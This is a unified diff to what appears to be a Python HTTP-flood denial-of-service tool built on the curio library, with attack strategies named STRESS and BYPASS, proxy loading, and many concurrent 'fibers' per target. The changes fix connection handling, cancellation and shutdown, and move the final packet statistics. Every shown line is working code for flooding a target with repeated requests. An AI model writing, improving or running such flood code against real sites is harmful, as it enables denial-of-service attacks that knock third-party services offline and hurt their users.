@@ -361,14 +361,16 @@ class TcpConnection:
             conn = curio.open_connection(
                 self._target.addr, self._target.port, ssl=self._target.ssl_context)
         try:
-            self._sock = await curio.timeout_after(ctx.connection_timeout, conn)
+            self._sock = await curio.timeout_after(self._ctx.connection_timeout, conn)
         except Exception as e:
             pass
         return self
 
     async def __aexit__(self, exc_t, exc_v, exc_tb):
         if exc_t:
-            print(exc_t, exc_v)
+            if isinstance(exc_v, curio.errors.TaskCancelled):
+                return True
+            print(exc_t, exc_v, isinstance(exc_t, curio.errors.TaskCancelled))
         if self._sock:
             await self._sock.close()
         if self._proxy_url and not self._packet_sent:
@@ -466,16 +468,17 @@ async def STRESS(ctx: Context, fid: int, target: Target):
 async def BYPASS(ctx: Context, fid: int, target: Target):
     """Sends HTTP get requests (RPC requests per TCP connection)."""
     async with TcpConnection(ctx, target) as conn:
-        for _ in range(ctx.rpc):
-            req = http_req_get(target)
-            await conn.sendall(req)
-            chunks = []
-            while True:
-                chunk = await conn.recv(1024)
-                if not chunk:
-                    break
-                chunks.append(chunk)
-            ctx.track_packet_sent(fid, target, len(req) + sum(map(len, chunks)))
+        if conn.sock:
+            for _ in range(ctx.rpc):
+                req = http_req_get(target)
+                await conn.sock.sendall(req)
+                chunks = []
+                while True:
+                    chunk = await conn.sock.recv(1024)
+                    if not chunk:
+                        break
+                    chunks.append(chunk)
+                ctx.track_packet_sent(fid, target, len(req) + sum(map(len, chunks)))
 
 
 async def flood_fiber(fid: int, ctx: Context, target: Target):
@@ -506,20 +509,27 @@ async def flood(ctx: Context):
     # xxx(okachaiev): periodically reload
     await load_proxies(ctx)
 
-    async with curio.TaskGroup() as g:
-        for target in ctx.targets:
-            print(f"==> Launching {ctx.num_fibers} fibers "
-                  f"targeting {target.url} for {ctx.stop_after_seconds}s")
-            for fid in range(ctx.num_fibers):
-                await g.spawn(flood_fiber, fid, ctx, target)
+    group = curio.TaskGroup()
+    for target in ctx.targets:
+        print(f"==> Launching {ctx.num_fibers} fibers "
+              f"targeting {target.url} for {ctx.stop_after_seconds}s")
+        for fid in range(ctx.num_fibers):
+            await group.spawn(flood_fiber, fid, ctx, target)
 
-        started_at = time.time()
-        while time.time() < started_at + ctx.stop_after_seconds:
-            await curio.sleep(10)
-            show_stats(ctx, time.time()-started_at)
-        
-        print("==> Initializing shutdown...")
-        await g.cancel_remaining()
+    started_at = time.time()
+    while time.time() < started_at + ctx.stop_after_seconds:
+        await curio.sleep(10)
+        show_stats(ctx, time.time()-started_at)
+
+    print("==> Initializing shutdown...")
+    terminted = await curio.ignore_after(10, group.cancel_remaining())
+    print("Timeout")
+    if terminted is None:
+        print("Shutdown timeout, forcing termination")
+    await group.join()
+
+    end_at = time.time()
+    show_final_stats(ctx, end_at-started_at, sign="🥃")
 
 
 def show_stats(ctx: Context, elapsed_seconds: int, sign="🦊"):
@@ -633,10 +643,8 @@ def parse_args(available_strategies):
 
 def run():
     ctx = Context.from_args(parse_args(default_strategies))
-    start_at = time.time()
     curio.run(flood(ctx))
-    end_at = time.time()
-    show_final_stats(ctx, end_at-start_at, sign="🥃")
+    exit(0)
 
 
 if __name__ == "__main__":
